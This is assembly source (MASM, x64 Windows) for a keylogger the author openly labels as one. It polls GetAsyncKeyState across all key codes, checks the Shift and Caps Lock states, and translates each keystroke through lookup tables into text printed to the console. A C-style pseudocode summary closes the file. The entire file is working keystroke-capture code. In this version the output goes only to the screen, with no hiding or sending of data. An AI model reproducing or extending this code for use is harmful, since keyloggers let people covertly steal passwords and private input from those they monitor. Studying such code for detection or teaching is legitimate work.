; ORCA on 10:14 PM 6/17/2022
; masm style keylogger, that print output to screen
; search is via array/offsets and not via switch
; 

option casemap:none


;------------------------------------------------------------------------------------------------------------
;------------------------------------------------------------------------------------------------------------
.const
;------------------------------------------------------------------------------------------------------------
PrintChar		byte '%c', 0
PrintChars		byte '%s', 0
;------------------------------------------------------------------------------------------------------------
; btw dont feel sorry about me writing the following arrays, i copied these from ida, so yeah i didnt write them directly :)
aBks            byte '[BKS]',0          
aTab			byte 9,0                 
aEnt			byte 0Ah,0                
aCtr            byte '[CTR]',0           
aAlt            byte '[ALT]',0            
aEsc            byte 'ESC',0             
aSp				byte ' ',0                
aEnd            byte '[END]',0           
aHom            byte '[HOM]',0           
aLa             byte '[LA]',0            
aUa             byte '[UA]',0           
aRa             byte '[RA]',0             
aDa             byte '[DA]',0             
aIns            byte '[INS]',0            
aDel            byte '[DEL]',0            
aHlp            byte '[HLP]',0            
a0              byte '0',0                
a1              byte '1',0                
a2              byte '2',0                
a3              byte '3',0                
a4              byte '4',0                
a5              byte '5',0                
a6              byte '6',0                
a7              byte '7',0                
a8              byte '8',0                
a9              byte '9',0                
aMul			byte '*',0                
aAdd			byte '+',0                
aCom			byte ',',0                
aMin			byte '-',0                
aDot			byte '.',0                
aBaKS			byte '/',0                
aF1             byte '[F1]',0             
aF2             byte '[F2]',0             
aF3             byte '[F3]',0            
aF4             byte '[F4]',0            
aF5             byte '[F5]',0             
aF6             byte '[F6]',0             
aF7             byte '[F7]',0             
aF8             byte '[F8]',0             
aF9             byte '[F9]',0             
aF10            byte '[F10]',0            
aF11            byte '[F11]',0            
aF12            byte '[F12]',0            
aF13            byte '[F13]',0            
aF14            byte '[F14]',0            
aF15            byte '[F15]',0            
aF16            byte '[F16]',0            
aF17            byte '[F17]',0            
aF18            byte '[F18]',0            
aF19            byte '[F19]',0            
aF20            byte '[F20]',0            
aF21            byte '[F21]',0            
aF22            byte '[F22]',0            
aF23            byte '[F23]',0            
aF24            byte '[F24]',0            
aS1				byte ')',0               
aS2				byte '!',0               
aS3				byte '@',0               
aS4				byte '#',0               
aS5				byte '$',0               
aS6				byte '%',0               
aS7				byte '^',0               
aS8				byte '&',0               
aS9				byte '(',0               
aS10			byte ':',0               
aS11			byte '<',0               
aS12			byte '_',0               
aS13			byte '>',0               
aS14			byte '?',0               
aS15			byte '~',0               
aS16			byte '{',0               
aS17			byte '|',0               
aS18			byte '}',0               
aS19			byte '"',0 
aS20			byte ';',0                
aS21			byte '=',0                
aS22			byte '`',0                
aS23			byte '[',0                
aS24			byte '\',0                
aS25			byte ']',0                
aS26			byte 27h,0  

;------------------------------------------------------------------------------------------------------------

chararray       qword offset aBks, offset aTab, offset aEnt
				qword offset aCtr, offset aAlt, offset aEsc, offset aSp 
				qword offset aEnd, offset aHom, offset aLa, offset aUa, offset aRa
				qword offset aDa, offset aIns, offset aDel, offset aHlp, offset a0
				qword offset a1, offset a2, offset a3, offset a4, offset a5
				qword offset a6, offset a7, offset a8, offset a9, offset aMul
				qword offset aAdd, offset aCom, offset aMin
				qword offset aDot, offset aBaKS, offset aF1
				qword offset aF2, offset aF3, offset aF4, offset aF5, offset aF6
				qword offset aF7, offset aF8, offset aF9, offset aF10, offset aF11
				qword offset aF12, offset aF13, offset aF14, offset aF15
				qword offset aF16, offset aF17, offset aF18, offset aF19
				qword offset aF20, offset aF21, offset aF22, offset aF23, offset aF24
 
;------------------------------------------------------------------------------------------------------------

ShiftOnArray    qword offset aS1, offset aS2, offset aS3
				qword offset aS4, offset aS5, offset aS6 
				qword offset aS7, offset aS8, offset aMul
				qword offset aS9, offset aS10, offset aAdd
				qword offset aS11, offset aS12, offset aS13
				qword offset aS14, offset aS15, offset aS16
				qword offset aS17, offset aS18, offset aS19
 

ShiftOffArray   qword offset a0, offset a1, offset a2, offset a3, offset a4
				qword offset a5, offset a6, offset a7, offset a8, offset a9 
				qword offset aS20, offset aS21, offset aCom
				qword offset aMin, offset aDot, offset aBaKS
				qword offset aS22, offset aS23, offset aS24
				qword offset aS25, offset aS26

;------------------------------------------------------------------------------------------------------------

intarray		dword 8, 9, 0Dh, 11h, 12h, 1Bh, 20h, 23h, 24h, 25h, 26h, 27h
				dword 28h, 2Dh, 2Eh, 2Fh, 60h, 61h, 62h, 63h, 64h, 65h, 66h
				dword 67h, 68h, 69h, 6Ah, 6Bh, 6Ch, 6Dh, 6Eh, 6Fh, 70h, 71h
				dword 72h, 73h, 74h, 75h, 76h, 77h, 78h, 79h, 7Ah, 7Bh, 7Ch
				dword 7Dh, 7Eh, 7Fh, 80h, 81h, 82h, 83h, 84h, 85h, 86h, 87h

intShitfArray	dword 30h, 31h, 32h, 33h, 34h, 35h, 36h, 37h, 38h, 39h, 0BAh
				dword 0BBh, 0BCh, 0BDh, 0BEh, 0BFh, 0C0h, 0DBh, 0DCh, 0DDh, 0DEh


;------------------------------------------------------------------------------------------------------------
;------------------------------------------------------------------------------------------------------------
.data
key dword ?
arg dword ?
lop	dword ?

;------------------------------------------------------------------------------------------------------------
;------------------------------------------------------------------------------------------------------------
.code
externdef printf:proc
externdef GetKeyState:proc
externdef GetAsyncKeyState:proc
;------------------------------------------------------------------------------------------------------------

;	VK_CAPITAL : 0x14 : 20
;	VK_SHIFT   : 0x10 : 16

; proc to check if any shift key is pressed:

IsShiftOn proc
	sub		rsp, 24
	mov		ecx, 10h		; 1st parm : VK_SHIFT
	call	GetKeyState		; return in rax
	cwde
	and     eax, 8000h		; check
	test    eax, eax		
	jz		Rfalse			; return 0 [results is in eax]
	mov     eax, 1			; return 1 [results is in eax]
	jmp		bye

Rfalse:
	xor     eax, eax

bye:
	add rsp, 24
	ret
IsShiftOn endp

;------------------------------------------------------------------------------------------------------------
; proc to check if caps lock key is toggled:

IsCapsLockOn proc
	sub		rsp, 24			
	mov     ecx, 14h		; 1st parm : VK_CAPITAL
	call	GetKeyState		; return in rax
	cwde
	and     eax, 1			; check
	test    eax, eax
	jz		Rfalse			; return 0 [results is in eax]
	mov     eax, 1			; return 1 [results is in eax]
	jmp		bye

Rfalse:
	xor     eax, eax

bye:
	add rsp, 24
	ret
IsCapsLockOn endp

;------------------------------------------------------------------------------------------------------------
	public keyLogg
keyLogg proc
	sub     rsp, 108h		; shadow storage

WhileLoop:
	xor     eax, eax
	cmp     eax, 1
	jz		bye				; infinte loop in while
	mov     key, 8

ForLoop:					; for(key = 8, key <= 255 , key ++)
	mov		eax, key
	cmp     eax, 0FFh		; 255
	jg		WhileLoop
	mov     ecx, key
	call	GetAsyncKeyState
	cwde
	cmp     eax, 0FFFF8001h	; if(GetAsyncKeyState(key)) == -32767
	jnz		false			; if not
	mov     ecx, key		; if yes: SearchAndWrite(key) 
	call	SearchAndWrite

false:
	inc key
	jmp ForLoop

bye:
	add     rsp, 108h
	ret
keyLogg endp

;------------------------------------------------------------------------------------------------------------
SearchInArray proc
	sub     rsp, 108h
	mov		lop, 0

WhileLoop:													
	cmp		lop, 38h
	jg		false
	movsxd  rax, lop
	lea     rcx, intarray
	mov     eax, [rcx+rax*4]		; search array of ints 
	cmp     arg, eax				; if (key == intarray[lop]) { chararray[lop] }
	jnz		Notfound
	movsxd  rax, lop
	lea     rcx, chararray
	mov     rdx, [rcx+rax*8]		; rdx is the 2nd arg
	lea     rcx, PrintChars         ; "%s"
	call    printf
	mov     eax, 1
	jmp bye

Notfound:													
	inc lop
	jmp WhileLoop
	
false:
	xor     eax, eax

bye:
	add     rsp, 108h
	ret
SearchInArray endp

;------------------------------------------------------------------------------------------------------------
SearchInOffShiftArray proc
	sub     rsp, 108h
	mov		lop, 0

WhileLoop:													
	cmp		lop, 16h
	jge		false
	movsxd  rax, lop
	lea     rcx, intShitfArray
	mov     eax, [rcx+rax*4]
	cmp     arg, eax				; if (key == intShitfArray[lop]) { ShiftOffArray[lop] }
	jnz		Notfound
	movsxd  rax, lop
	lea     rcx, ShiftOffArray
	mov     rdx, [rcx+rax*8]
	lea     rcx, PrintChars         ; "%s"
	call    printf
	mov     eax, 1
	jmp bye

Notfound:												
	inc lop
	jmp WhileLoop

false:
	xor     eax, eax

bye:
	add     rsp, 108h
	ret
SearchInOffShiftArray endp

;------------------------------------------------------------------------------------------------------------
; called if  shift key is detected (IsShiftOn returned true)
SearchInOnShiftArray proc
	sub     rsp, 108h
	mov		lop, 0

WhileLoop:													
	cmp		lop, 16h
	jge		false
	movsxd  rax, lop
	lea     rcx, intShitfArray
	mov     eax, [rcx+rax*4]
	cmp     arg, eax				; if (key == intShitfArray[lop]) { ShiftOnArray[lop] }
	jnz		Notfound
	movsxd  rax, lop
	lea     rcx, ShiftOnArray
	mov     rdx, [rcx+rax*8]
	lea     rcx, PrintChars         ; "%s"
	call    printf
	mov     eax, 1
	jmp bye

Notfound:												
	inc lop
	jmp WhileLoop

false:
	xor     eax, eax

bye:
	add     rsp, 108h
	ret
SearchInOnShiftArray endp


;------------------------------------------------------------------------------------------------------------

SearchAndWrite proc
	sub     rsp, 108h
	mov		arg, ecx		; key passed through ecx
	cmp     arg, 41h
	jl		NotAZ
	cmp		arg, 5Ah
	jg		NotAZ			; ! ((arg >= 65) && (arg <= 90))
	call	IsShiftOn		; in range
	test    eax, eax
	jnz		Jmpelse			; !IsShiftOn()
	call    IsCapsLockOn
	test    eax, eax
	jnz		Jmpelse			; !IsCapsLockOn()
	mov     eax, arg	
	add     eax, 20h		; argv += 32 : print small
	mov     arg, eax
	movsx   eax, byte ptr [arg]
	mov     edx, eax
	lea     rcx, PrintChar	; "%c"
	call    printf
	jmp		bye

NotAZ:						; special char											
	call	IsShiftOn
	test    eax, eax
	jnz		ShiftChar		; !IsShiftOn()
	mov		ecx, arg
	call    SearchInOffShiftArray
	test    eax, eax
	jnz		bye				;SearchInOffShiftArray() 
	mov		ecx, arg
	call    SearchInArray
	jmp		bye

ShiftChar:					; if shift is detected						
	call	IsShiftOn
	test    eax, eax
	jz		bye				; IsShiftOn() done successfuly
	mov		ecx, arg
	call	SearchInOnShiftArray
	test    eax, eax
	jnz		bye				; SearchInOnShiftArray()  
	mov		ecx, arg
	call    SearchInArray
	jmp		bye

Jmpelse:													
	call	IsShiftOn	
	test    eax, eax
	jnz		BigChar			; IsShiftOn()
	call	IsCapsLockOn	
	test    eax, eax
	jz		bye				; !IsCapsLockOn()

BigChar:													
	movsx   eax, byte ptr [arg]
	mov     edx, eax		; print directly (capital)
	lea     rcx, PrintChar	; "%c"
	call    printf
	jmp     bye

bye:
	add     rsp, 108h
	ret

SearchAndWrite endp

;------------------------------------------------------------------------------------------------------------
; SearchAndWrite is a big ass boi, here is what it does (kinda):
; void SearchAndWrite(int key) {
;	if ((key >= 65) && (key <= 90)) {
;		if (!IsShiftOn() && !IsCapsLockOn()) {
;			key += 32;
;			printf("%c", (char)key);
;		}
;
;		if (IsShiftOn() || IsCapsLockOn()) {
;			printf("%c", (char)key);
;		}
;	}
;	else if (!IsShiftOn()) {
;		if (SearchInOffShiftArray(key)) {
;			return;
;		}
;		SearchInArray(key);
;	}
;	else if (IsShiftOn()) {
;		if (SearchInOnShiftArray(key)) {
;			return;
;		}
;		SearchInArray(key);
;	}
;	return;
; }



end

;------------------------------------------------------------------------------------------------------------
;------------------------------------------------------------------------------------------------------------
